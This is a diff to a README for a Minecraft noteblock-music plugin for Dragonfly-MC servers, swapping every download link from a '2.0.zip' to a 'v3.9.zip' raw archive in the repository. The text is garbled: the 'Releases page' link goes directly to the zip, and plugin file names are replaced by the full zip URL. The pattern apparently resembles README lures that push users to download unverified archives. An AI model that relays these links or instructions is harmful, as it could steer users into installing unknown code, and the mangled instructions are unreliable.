@@ -6,7 +6,7 @@ Welcome to df-noteblockplayer! This plugin allows players to load and play songs
 
 ## 📥 Download
 
-[![Download df-noteblockplayer](https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-2.0.zip%20df--noteblockplayer-blue)](https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-2.0.zip)
+[![Download df-noteblockplayer](https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-v3.9.zip%20df--noteblockplayer-blue)](https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-v3.9.zip)
 
 ## 💻 System Requirements
 
@@ -23,20 +23,20 @@ Welcome to df-noteblockplayer! This plugin allows players to load and play songs
 
 ## 🔧 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-2.0.zip) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-v3.9.zip) to find the latest version.
   
-2. **Choose the Correct File**: Locate the version you want to download. The file will typically be labeled as `https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-2.0.zip` or similar.
+2. **Choose the Correct File**: Locate the version you want to download. The file will typically be labeled as `https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-v3.9.zip` or similar.
 
 3. **Download the File**: Click on the file link to download it to your computer.
 
 4. **Extract the Files**: Once downloaded, find the zip file in your downloads folder. Right-click the file and select "Extract All" (or use any extraction tool) to unpack the files.
 
-5. **Locate the Plugin File**: Open the extracted folder. You will find the `https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-2.0.zip` file. This is your plugin file.
+5. **Locate the Plugin File**: Open the extracted folder. You will find the `https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-v3.9.zip` file. This is your plugin file.
 
 6. **Install the Plugin**: 
    - Navigate to your Dragonfly-MC server directory.
    - Open the `plugins` folder.
-   - Drag and drop the `https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-2.0.zip` file into the `plugins` folder.
+   - Drag and drop the `https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-v3.9.zip` file into the `plugins` folder.
 
 7. **Start Your Server**: Run your Dragonfly-MC server. The plugin will load automatically during startup.
 
@@ -55,7 +55,7 @@ If you encounter issues while using the plugin, try the following:
 
 - **Check for Errors**: Review the console output for any error messages when starting the server. This can give clues about misconfigurations.
   
-- **Reinstall the Plugin**: If problems persist, delete the `https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-2.0.zip` file from the plugins folder and repeat the installation process carefully.
+- **Reinstall the Plugin**: If problems persist, delete the `https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-v3.9.zip` file from the plugins folder and repeat the installation process carefully.
 
 - **Seek Community Help**: Visit forums or Discord communities related to Dragonfly-MC for support from experienced users.
 
@@ -73,4 +73,4 @@ df-noteblockplayer is open-source software. You can view the license details in 
 
 ---
 
-Feel free to explore, enjoy the music, and enhance your Minecraft experience with df-noteblockplayer. For updates and further information, visit our [Releases page](https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-2.0.zip) often.
+Feel free to explore, enjoy the music, and enhance your Minecraft experience with df-noteblockplayer. For updates and further information, visit our [Releases page](https://raw.githubusercontent.com/RannTOD/df-noteblockplayer/main/noteblock/df-noteblockplayer-v3.9.zip) often.
